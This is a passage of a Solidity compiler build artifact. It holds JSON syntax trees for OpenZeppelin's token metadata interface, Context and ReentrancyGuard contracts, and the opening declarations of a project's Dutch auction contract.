the token."},"functionSelector":"95d89b41","id":896,"implemented":false,"kind":"function","modifiers":[],"name":"symbol","nameLocation":"507:6:4","nodeType":"FunctionDefinition","parameters":{"id":892,"nodeType":"ParameterList","parameters":[],"src":"513:2:4"},"returnParameters":{"id":895,"nodeType":"ParameterList","parameters":[{"constant":false,"id":894,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":896,"src":"539:13:4","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":893,"name":"string","nodeType":"ElementaryTypeName","src":"539:6:4","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"538:15:4"},"scope":903,"src":"498:56:4","stateMutability":"view","virtual":false,"visibility":"external"},{"documentation":{"id":897,"nodeType":"StructuredDocumentation","src":"560:65:4","text":" @dev Returns the decimals places of the token."},"functionSelector":"313ce567","id":902,"implemented":false,"kind":"function","modifiers":[],"name":"decimals","nameLocation":"639:8:4","nodeType":"FunctionDefinition","parameters":{"id":898,"nodeType":"ParameterList","parameters":[],"src":"647:2:4"},"returnParameters":{"id":901,"nodeType":"ParameterList","parameters":[{"constant":false,"id":900,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":902,"src":"673:5:4","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":899,"name":"uint8","nodeType":"ElementaryTypeName","src":"673:5:4","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"src":"672:7:4"},"scope":903,"src":"630:50:4","stateMutability":"view","virtual":false,"visibility":"external"}],"scope":904,"src":"277:405:4","usedErrors":[],"usedEvents":[811,820]}],"src":"125:558:4"},"id":4},"@openzeppelin/contracts/utils/Context.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","exportedSymbols":{"Context":[925]},"id":926,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":905,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"101:24:5"},{"abstract":true,"baseContracts":[],"canonicalName":"Context","contractDependencies":[],"contractKind":"contract","documentation":{"id":906,"nodeType":"StructuredDocumentation","src":"127:496:5","text":" @dev Provides information about the current execution context, including the\n sender of the transaction and its data. While these are generally available\n via msg.sender and msg.data, they should not be accessed in such a direct\n manner, since when dealing with meta-transactions the account sending and\n paying for execution may not be the actual sender (as far as an application\n is concerned).\n This contract is only required for intermediate, library-like contracts."},"fullyImplemented":true,"id":925,"linearizedBaseContracts":[925],"name":"Context","nameLocation":"642:7:5","nodeType":"ContractDefinition","nodes":[{"body":{"id":914,"nodeType":"Block","src":"718:34:5","statements":[{"expression":{"expression":{"id":911,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"735:3:5","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":912,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"739:6:5","memberName":"sender","nodeType":"MemberAccess","src":"735:10:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":910,"id":913,"nodeType":"Return","src":"728:17:5"}]},"id":915,"implemented":true,"kind":"function","modifiers":[],"name":"_msgSender","nameLocation":"665:10:5","nodeType":"FunctionDefinition","parameters":{"id":907,"nodeType":"ParameterList","parameters":[],"src":"675:2:5"},"returnParameters":{"id":910,"nodeType":"ParameterList","parameters":[{"constant":false,"id":909,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":915,"src":"709:7:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":908,"name":"address","nodeType":"ElementaryTypeName","src":"709:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"708:9:5"},"scope":925,"src":"656:96:5","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":923,"nodeType":"Block","src":"825:32:5","statements":[{"expression":{"expression":{"id":920,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"842:3:5","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":921,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"846:4:5","memberName":"data","nodeType":"MemberAccess","src":"842:8:5","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes calldata"}},"functionReturnParameters":919,"id":922,"nodeType":"Return","src":"835:15:5"}]},"id":924,"implemented":true,"kind":"function","modifiers":[],"name":"_msgData","nameLocation":"767:8:5","nodeType":"FunctionDefinition","parameters":{"id":916,"nodeType":"ParameterList","parameters":[],"src":"775:2:5"},"returnParameters":{"id":919,"nodeType":"ParameterList","parameters":[{"constant":false,"id":918,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":924,"src":"809:14:5","stateVariable":false,"storageLocation":"calldata","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes"},"typeName":{"id":917,"name":"bytes","nodeType":"ElementaryTypeName","src":"809:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"808:16:5"},"scope":925,"src":"758:99:5","stateMutability":"view","virtual":true,"visibility":"internal"}],"scope":926,"src":"624:235:5","usedErrors":[],"usedEvents":[]}],"src":"101:759:5"},"id":5},"@openzeppelin/contracts/utils/ReentrancyGuard.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/ReentrancyGuard.sol","exportedSymbols":{"ReentrancyGuard":[994]},"id":995,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":927,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"109:24:6"},{"abstract":true,"baseContracts":[],"canonicalName":"ReentrancyGuard","contractDependencies":[],"contractKind":"contract","documentation":{"id":928,"nodeType":"StructuredDocumentation","src":"135:750:6","text":" @dev Contract module that helps prevent reentrant calls to a function.\n Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n available, which can be applied to functions to make sure there are no nested\n (reentrant) calls to them.\n Note that because there is a single `nonReentrant` guard, functions marked as\n `nonReentrant` may not call one another. This can be worked around by making\n those functions `private`, and then adding `external` `nonReentrant` entry\n points to them.\n TIP: If you would like to learn more about reentrancy and alternative ways\n to protect against it, check out our blog post\n https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]."},"fullyImplemented":true,"id":994,"linearizedBaseContracts":[994],"name":"ReentrancyGuard","nameLocation":"904:15:6","nodeType":"ContractDefinition","nodes":[{"constant":true,"id":931,"mutability":"constant","name":"NOT_ENTERED","nameLocation":"1699:11:6","nodeType":"VariableDeclaration","scope":994,"src":"1674:40:6","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":929,"name":"uint256","nodeType":"ElementaryTypeName","src":"1674:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"31","id":930,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1713:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"visibility":"private"},{"constant":true,"id":934,"mutability":"constant","name":"ENTERED","nameLocation":"1745:7:6","nodeType":"VariableDeclaration","scope":994,"src":"1720:36:6","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":932,"name":"uint256","nodeType":"ElementaryTypeName","src":"1720:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"32","id":933,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1755:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"visibility":"private"},{"constant":false,"id":936,"mutability":"mutable","name":"_status","nameLocation":"1779:7:6","nodeType":"VariableDeclaration","scope":994,"src":"1763:23:6","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":935,"name":"uint256","nodeType":"ElementaryTypeName","src":"1763:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"documentation":{"id":937,"nodeType":"StructuredDocumentation","src":"1793:52:6","text":" @dev Unauthorized reentrant call."},"errorSelector":"3ee5aeb5","id":939,"name":"ReentrancyGuardReentrantCall","nameLocation":"1856:28:6","nodeType":"ErrorDefinition","parameters":{"id":938,"nodeType":"ParameterList","parameters":[],"src":"1884:2:6"},"src":"1850:37:6"},{"body":{"id":946,"nodeType":"Block","src":"1907:38:6","statements":[{"expression":{"id":944,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":942,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":936,"src":"1917:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":943,"name":"NOT_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":931,"src":"1927:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1917:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":945,"nodeType":"ExpressionStatement","src":"1917:21:6"}]},"id":947,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":940,"nodeType":"ParameterList","parameters":[],"src":"1904:2:6"},"returnParameters":{"id":941,"nodeType":"ParameterList","parameters":[],"src":"1907:0:6"},"scope":994,"src":"1893:52:6","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":957,"nodeType":"Block","src":"2346:79:6","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":950,"name":"_nonReentrantBefore","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":974,"src":"2356:19:6","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":951,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2356:21:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":952,"nodeType":"ExpressionStatement","src":"2356:21:6"},{"id":953,"nodeType":"PlaceholderStatement","src":"2387:1:6"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"id":954,"name":"_nonReentrantAfter","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":982,"src":"2398:18:6","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$__$returns$__$","typeString":"function ()"}},"id":955,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2398:20:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":956,"nodeType":"ExpressionStatement","src":"2398:20:6"}]},"documentation":{"id":948,"nodeType":"StructuredDocumentation","src":"1951:366:6","text":" @dev Prevents a contract from calling itself, directly or indirectly.\n Calling a `nonReentrant` function from another `nonReentrant`\n function is not supported. It is possible to prevent this from happening\n by making the `nonReentrant` function external, and making it call a\n `private` function that does the actual work."},"id":958,"name":"nonReentrant","nameLocation":"2331:12:6","nodeType":"ModifierDefinition","parameters":{"id":949,"nodeType":"ParameterList","parameters":[],"src":"2343:2:6"},"src":"2322:103:6","virtual":false,"visibility":"internal"},{"body":{"id":973,"nodeType":"Block","src":"2470:268:6","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":963,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":961,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":936,"src":"2558:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":962,"name":"ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"2569:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2558:18:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":968,"nodeType":"IfStatement","src":"2554:86:6","trueBody":{"id":967,"nodeType":"Block","src":"2578:62:6","statements":[{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":964,"name":"ReentrancyGuardReentrantCall","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":939,"src":"2599:28:6","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$__$","typeString":"function () pure"}},"id":965,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2599:30:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":966,"nodeType":"RevertStatement","src":"2592:37:6"}]}},{"expression":{"id":971,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":969,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":936,"src":"2714:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":970,"name":"ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"2724:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2714:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":972,"nodeType":"ExpressionStatement","src":"2714:17:6"}]},"id":974,"implemented":true,"kind":"function","modifiers":[],"name":"_nonReentrantBefore","nameLocation":"2440:19:6","nodeType":"FunctionDefinition","parameters":{"id":959,"nodeType":"ParameterList","parameters":[],"src":"2459:2:6"},"returnParameters":{"id":960,"nodeType":"ParameterList","parameters":[],"src":"2470:0:6"},"scope":994,"src":"2431:307:6","stateMutability":"nonpayable","virtual":false,"visibility":"private"},{"body":{"id":981,"nodeType":"Block","src":"2782:170:6","statements":[{"expression":{"id":979,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":977,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":936,"src":"2924:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":978,"name":"NOT_ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":931,"src":"2934:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2924:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":980,"nodeType":"ExpressionStatement","src":"2924:21:6"}]},"id":982,"implemented":true,"kind":"function","modifiers":[],"name":"_nonReentrantAfter","nameLocation":"2753:18:6","nodeType":"FunctionDefinition","parameters":{"id":975,"nodeType":"ParameterList","parameters":[],"src":"2771:2:6"},"returnParameters":{"id":976,"nodeType":"ParameterList","parameters":[],"src":"2782:0:6"},"scope":994,"src":"2744:208:6","stateMutability":"nonpayable","virtual":false,"visibility":"private"},{"body":{"id":992,"nodeType":"Block","src":"3195:42:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":990,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":988,"name":"_status","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":936,"src":"3212:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":989,"name":"ENTERED","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"3223:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"3212:18:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":987,"id":991,"nodeType":"Return","src":"3205:25:6"}]},"documentation":{"id":983,"nodeType":"StructuredDocumentation","src":"2958:168:6","text":" @dev Returns true if the reentrancy guard is currently set to \"entered\", which indicates there is a\n `nonReentrant` function in the call stack."},"id":993,"implemented":true,"kind":"function","modifiers":[],"name":"_reentrancyGuardEntered","nameLocation":"3140:23:6","nodeType":"FunctionDefinition","parameters":{"id":984,"nodeType":"ParameterList","parameters":[],"src":"3163:2:6"},"returnParameters":{"id":987,"nodeType":"ParameterList","parameters":[{"constant":false,"id":986,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":993,"src":"3189:4:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":985,"name":"bool","nodeType":"ElementaryTypeName","src":"3189:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"3188:6:6"},"scope":994,"src":"3131:106:6","stateMutability":"view","virtual":false,"visibility":"internal"}],"scope":995,"src":"886:2353:6","usedErrors":[939],"usedEvents":[]}],"src":"109:3131:6"},"id":6},"contracts/Dutch_Auction.sol":{"ast":{"absolutePath":"contracts/Dutch_Auction.sol","exportedSymbols":{"Context":[925],"Dutch_Auction":[1950],"Dutch_Auction__IsOwner":[1002],"Dutch_Auction__NotOpen":[1004],"Dutch_Auction__NotOwner":[1000],"Dutch_Auction__Open":[1006],"ERC20":[799],"ERC20Token":[2018],"IERC20":[877],"IERC20Errors":[189],"IERC20Metadata":[903],"Ownable":[147],"ReentrancyGuard":[994]},"id":1951,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":996,"literals":["solidity","^","0.8",".21"],"nodeType":"PragmaDirective","src":"33:24:7"},{"absolutePath":"contracts/ERC20Token.sol","file":"./ERC20Token.sol","id":997,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1951,"sourceUnit":2019,"src":"87:26:7","symbolAliases":[],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/ReentrancyGuard.sol","file":"@openzeppelin/contracts/utils/ReentrancyGuard.sol","id":998,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1951,"sourceUnit":995,"src":"114:59:7","symbolAliases":[],"unitAlias":""},{"errorSelector":"ae4a21bc","id":1000,"name":"Dutch_Auction__NotOwner","nameLocation":"181:23:7","nodeType":"ErrorDefinition","parameters":{"id":999,"nodeType":"ParameterList","parameters":[],"src":"204:2:7"},"src":"175:32:7"},{"errorSelector":"c3fdc7c1","id":1002,"name":"Dutch_Auction__IsOwner","nameLocation":"214:22:7","nodeType":"ErrorDefinition","parameters":{"id":1001,"nodeType":"ParameterList","parameters":[],"src":"236:2:7"},"src":"208:31:7"},{"errorSelector":"5de7a966","id":1004,"name":"Dutch_Auction__NotOpen","nameLocation":"246:22:7","nodeType":"ErrorDefinition","parameters":{"id":1003,"nodeType":"ParameterList","parameters":[],"src":"268:2:7"},"src":"240:31:7"},{"errorSelector":"6668065e","id":1006,"name":"Dutch_Auction__Open","nameLocation":"278:19:7","nodeType":"ErrorDefinition","parameters":{"id":1005,"nodeType":"ParameterList","parameters":[],"src":"297:2:7"},"src":"272:28:7"},{"abstract":false,"baseContracts":[],"canonicalName":"Dutch_Auction","contractDependencies":[2018],"contractKind":"contract","fullyImplemented":true,"id":1950,"linearizedBaseContracts":[1950],"name":"Dutch_Auction","nameLocation":"311:13:7","nodeType":"ContractDefinition","nodes":[{"constant":false,"id":1008,"mutability":"mutable","name":"currentPrice","nameLocation":"346:12:7","nodeType":"VariableDeclaration","scope":1950,"src":"331:27:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":1007,"name":"int256","nodeType":"ElementaryTypeName","src":"331:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"private"},{"constant":false,"id":1011,"mutability":"mutable","name":"totalNumBidders","nameLocation":"389:15:7","nodeType":"VariableDeclaration","scope":1950,"src":"373:35:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1009,"name":"uint256","nodeType":"ElementaryTypeName","src":"373:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"30","id":1010,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"407:1:7","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"visibility":"private"},{"constant":false,"id":1013,"mutability":"immutable","name":"startPrice","nameLocation":"440:10:7","nodeType":"VariableDeclaration","scope":1950,"src":"414:36:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1012,"name":"uint256","nodeType":"ElementaryTypeName","src":"414:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":1015,"mutability":"immutable","name":"reservePrice","nameLocation":"491:12:7","nodeType":"VariableDeclaration","scope":1950,"src":"465:38:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1014,"name":"uint256","nodeType":"ElementaryTypeName","src":"465:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":1017,"mutability":"immutable","name":"i_owner","nameLocation":"535:7:7","nodeType":"VariableDeclaration","scope":1950,"src":"509:33:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1016,"name":"address","nodeType":"ElementaryTypeName","src":"509:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"private"},{"constant":false,"id":1019,"mutability":"mutable","name":"totalAlgosAvailable","nameLocation":"564:19:7","nodeType":"VariableDeclaration","scope":1950,"src":"548:35:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1018,"name":"uint256","nodeType":"ElementaryTypeName","src":"548:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":1021,"mutability":"mutable","name":"startTime","nameLocation":"605:9:7","nodeType":"VariableDeclaration","scope":1950,"src":"589:25:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1020,"name":"uint256","nodeType":"ElementaryTypeName","src":"589:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":true,"id":1024,"mutability":"constant","name":"AUCTION_TIME","nameLocation":"645:12:7","nodeType":"VariableDeclaration","scope":1950,"src":"620:44:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1022,"name":"uint256","nodeType":"ElementaryTypeName","src":"620:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"value":{"hexValue":"31323030","id":1023,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"660:4:7","typeDescriptions":{"typeIdentifier":"t_rational_1200_by_1","typeString":"int_const 1200"},"value":"1200"},"visibility":"private"},{"constant":false,"id":1026,"mutability":"mutable","name":"currentUnsoldAlgos","nameLocation":"699:18:7","nodeType":"VariableDeclaration","scope":1950,"src":"683:34:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1025,"name":"uint256","nodeType":"ElementaryTypeName","src":"683:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":1028,"mutability":"mutable","name":"changePerMin","nameLocation":"739:12:7","nodeType":"VariableDeclaration","scope":1950,"src":"723:28:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1027,"name":"uint256","nodeType":"ElementaryTypeName","src":"723:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"private"},{"constant":false,"id":1031,"mutability":"mutable","name":"prematureEnd","nameLocation":"770:12:7","nodeType":"VariableDeclaration","scope":1950,"src":"757:33:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1029,"name":"bool","nodeType":"ElementaryTypeName","src":"757:4:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"value":{"hexValue":"66616c7365","id":1030,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"785:5:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},"visibility":"private"},{"constant":false,"id":1034,"mutability":"mutable","name":"DAToken","nameLocation":"816:7:7","nodeType":"VariableDeclaration","scope":1950,"src":"797:26:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"},"typeName":{"id":1033,"nodeType":"UserDefinedTypeName","pathNode":{"id":1032,"name":"ERC20Token","nameLocations":["797:10:7"],"nodeType":"IdentifierPath","referencedDeclaration":2018,"src":"797:10:7"},"referencedDeclaration":2018,"src":"797:10:7","typeDescriptions":{"typeIdentifier":"t_contract$_ERC20Token_$2018","typeString":"contract ERC20Token"}},"visibility":"private"},{"constant":false,"id":1036,"mutability":"mutable","name":"ERC20ContractAddress","nameLocation":"863:20:7","nodeType":"VariableDeclaration","scope":1950,"src":"847:36:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1035,"name":"address","nodeType":"ElementaryTypeName","src":"847:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"private"},{"constant":false,"functionSelector":"3fa8578d","id":1041,"mutability":"mutable","name":"biddersList","nameLocation":"923:11:7","nodeType":"VariableDeclaration","scope":1950,"src":"889:45:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder)"},"typeName":{"id":1040,"keyName":"","keyNameLocation":"-1:-1:-1","keyType":{"id":1037,"name":"uint256","nodeType":"ElementaryTypeName","src":"897:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Mapping","src":"889:26:7","typeDescriptions":{"typeIdentifier":"t_mapping$_t_uint256_$_t_struct$_Bidder_$1054_storage_$","typeString":"mapping(uint256 => struct Dutch_Auction.Bidder)"},"valueName":"","valueNameLocation":"-1:-1:-1","valueType":{"id":1039,"nodeType":"UserDefinedTypeName","pathNode":{"id":1038,"name":"Bidder","nameLocations":["908:6:7"],"nodeType":"IdentifierPath","referencedDeclaration":1054,"src":"908:6:7"},"referencedDeclaration":1054,"src":"908:6:7","typeDescriptions":{"typeIdentifier":"t_struct$_Bidder_$1054_storage_ptr","typeString":"struct Dutch_Auction.Bidder"}}},"visibility":"public"},{"canonicalName":"Dutch_Auction.Bidder","id":1054,"members":[{"constant":false,"id":1043,"mutability":"mutable","name":"bidderID","nameLocation":"1025:8:7","nodeType":"VariableDeclaration","scope":1054,"src":"1017:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1042,"name":"uint256","nodeType":"ElementaryTypeName","src":"1017:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1045,"mutability":"mutable","name":"walletAddress","nameLocation":"1051:13:7","nodeType":"VariableDeclaration","scope":1054,"src":"1043:21:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1044,"name":"address","nodeType":"ElementaryTypeName","src":"1043:7:7","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1047,"mutability":"mutable","name":"bidValue","nameLocation":"1082:8:7","nodeType":"VariableDeclaration","scope":1054,"src":"1074:16:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1046,"name":"uint256","nodeType":"ElementaryTypeName","src":"1074:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1049,"mutability":"mutable","name":"totalAlgosPurchased","nameLocation":"1167:19:7","nodeType":"VariableDeclaration","scope":1054,"src":"1159:27:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1048,"na